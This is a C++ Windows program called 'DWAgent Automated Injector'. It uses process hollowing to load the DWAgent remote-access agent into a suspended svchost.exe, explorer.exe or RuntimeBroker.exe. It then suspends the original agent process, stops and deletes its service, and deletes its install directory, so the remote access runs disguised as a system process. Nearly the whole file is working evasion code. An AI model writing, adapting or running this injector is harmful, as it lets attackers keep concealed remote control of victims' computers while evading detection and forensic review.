#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>

// --- Prototypes ---
DWORD GetProcessIdByName(const char* processName);
std::vector<BYTE> ReadPeFileIntoBuffer(const char* filePath);
PROCESS_INFORMATION CreateSuspendedProcess(const char* targetPath);
bool ProcessHollowing(const char* payloadPath, const char* hostPath);
bool FileExists(const std::string& path);
void RunServiceCommand(const std::string& action);
void DeleteDirectoryContents(const std::string& directory);

/**
 * Main Automation Logic
 */
int main() {
    std::cout << "=== DWAgent Automated Injector ===" << std::endl;

    // 1. Search for dwagent.exe payload
    std::string payloadPath = "";
    std::vector<std::string> searchLocations = {
        "C:\\Program Files\\DWAgent\\runtime\\dwagent.exe",
        "C:\\Program Files (x86)\\DWAgent\\runtime\\dwagent.exe"
    };

    for (const auto& path : searchLocations) {
        if (FileExists(path)) {
            payloadPath = path;
            std::cout << "[FOUND] Payload at: " << payloadPath << std::endl;
            break;
        }
    }

    if (payloadPath.empty()) {
        std::cerr << "[ERROR] dwagent.exe not found in standard locations." << std::endl;
        return 1;
    }

    // Get the PID of the original dwagent.exe if it's currently running
    DWORD originalPid = GetProcessIdByName("dwagent.exe");

    // 2. Search for a running host process
    struct HostCandidate { const char* name; const char* path; };
    HostCandidate candidates[] = {
        {"svchost.exe", "C:\\Windows\\System32\\svchost.exe"},
        {"explorer.exe", "C:\\Windows\\explorer.exe"},
        {"RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe"}
    };

    std::string selectedHostPath = "";
    for (const auto& candidate : candidates) {
        if (GetProcessIdByName(candidate.name) != 0) {
            selectedHostPath = candidate.path;
            std::cout << "[HOST] Found running instance of " << candidate.name << ". Targeting: " << selectedHostPath << std::endl;
            break;
        }
    }

    if (selectedHostPath.empty()) {
        std::cerr << "[ERROR] No suitable running host process found." << std::endl;
        return 1;
    }

    // 3. Perform Hollowing
    std::cout << "[STARTING] Beginning process hollowing..." << std::endl;
    if (ProcessHollowing(payloadPath.c_str(), selectedHostPath.c_str())) {
        std::cout << "[INJECTED] Successfully hollowed " << selectedHostPath << " with " << payloadPath << std::endl;

        // 4. Suspend original process after delay
        if (originalPid != 0) {
            std::cout << "[WAITING] 30 seconds for stabilization..." << std::endl;
            Sleep(30000);

            // Open handle with sufficient rights for NtSuspendProcess
            HANDLE hOriginal = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, originalPid);
            if (hOriginal) {
                HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
                auto NtSuspendProcess = (long (NTAPI*)(HANDLE))GetProcAddress(hNtdll, "NtSuspendProcess");
                
                if (NtSuspendProcess) {
                    NtSuspendProcess(hOriginal);
                   
                    std::cout << "[SUSPENDED] Original dwagent.exe (PID: " << originalPid << ")" << std::endl;
                   

                } else {
                    std::cerr << "[ERROR] Could not resolve NtSuspendProcess from ntdll.dll" << std::endl;
                }
                CloseHandle(hOriginal);

                // 5. Cleanup service and files
                std::cout << "[CLEANING] Removing DWAgent service and files..." << std::endl;
                RunServiceCommand("stop");
                RunServiceCommand("delete");

                // Identify base directory to delete (C:\Program Files\DWAgent)
                std::string folderToDelete = "";
                if (payloadPath.find("C:\\Program Files\\DWAgent") != std::string::npos) 
                    folderToDelete = "C:\\Program Files\\DWAgent";
                else if (payloadPath.find("C:\\Program Files (x86)\\DWAgent") != std::string::npos) 
                    folderToDelete = "C:\\Program Files (x86)\\DWAgent";

                if (!folderToDelete.empty()) {
                    DeleteDirectoryContents(folderToDelete);
                    RemoveDirectoryA(folderToDelete.c_str());
                    std::cout << "[CLEANED] Service removed and directory deleted." << std::endl;
                }
            }
        }
    } else {
        std::cerr << "[FAILED] Hollowing failed." << std::endl;
        return 1;
    }

    return 0;
}

// --- Helper Implementations ---

/**
 * Executes sc.exe commands to manage the DWAgent service.
 */
void RunServiceCommand(const std::string& action) {
    std::string cmdLine = "cmd.exe /c sc " + action + " DWAgent";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    std::vector<char> modifiableCmd(cmdLine.begin(), cmdLine.end());
    modifiableCmd.push_back('\0');

    if (CreateProcessA(NULL, modifiableCmd.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

/**
 * Recursively deletes files and subdirectories using DeleteFile and RemoveDirectory.
 */
void DeleteDirectoryContents(const std::string& directory) {
    std::string searchPath = directory + "\\*";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
                std::string filePath = directory + "\\" + findData.cFileName;
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    DeleteDirectoryContents(filePath);
                    RemoveDirectoryA(filePath.c_str());
                } else {
                    DeleteFileA(filePath.c_str());
                }
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
}

bool FileExists(const std::string& path) {
    DWORD dwAttrib = GetFileAttributesA(path.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

DWORD GetProcessIdByName(const char* processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, processName) == 0) {
                processId = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processId;
}

std::vector<BYTE> ReadPeFileIntoBuffer(const char* filePath) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return {};

    DWORD size = GetFileSize(hFile, NULL);
    std::vector<BYTE> buffer(size);
    DWORD read;
    ReadFile(hFile, buffer.data(), size, &read, NULL);
    CloseHandle(hFile);
    return buffer;
}

PROCESS_INFORMATION CreateSuspendedProcess(const char* targetPath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "[-] CreateProcessA error: " << GetLastError() << std::endl;
    }
    return pi;
}

bool ProcessHollowing(const char* payloadPath, const char* hostPath) {
    std::vector<BYTE> payload = ReadPeFileIntoBuffer(payloadPath);
    if (payload.empty()) return false;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload.data();
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload.data() + dos->e_lfanew);

    PROCESS_INFORMATION pi = CreateSuspendedProcess(hostPath);
    if (!pi.hProcess) return false;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    PVOID remoteBase = nullptr;
#ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remoteBase, sizeof(PVOID), NULL);
#else
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08), &remoteBase, sizeof(PVOID), NULL);
#endif

    auto NtUnmapViewOfSection = (long (NTAPI*)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    if (NtUnmapViewOfSection) NtUnmapViewOfSection(pi.hProcess, remoteBase);

    PVOID newBase = VirtualAllocEx(pi.hProcess, (PVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) newBase = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!newBase) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    WriteProcessMemory(pi.hProcess, newBase, payload.data(), nt->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess, (PVOID)((LPBYTE)newBase + section[i].VirtualAddress), 
                           (PVOID)(payload.data() + section[i].PointerToRawData), section[i].SizeOfRawData, NULL);
    }

#ifdef _WIN64
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &newBase, sizeof(PVOID), NULL);
    ctx.Rcx = (DWORD64)newBase + nt->OptionalHeader.AddressOfEntryPoint;
#else
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 0x08), &newBase, sizeof(PVOID), NULL);
    ctx.Eax = (DWORD)newBase + nt->OptionalHeader.AddressOfEntryPoint;
#endif

    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}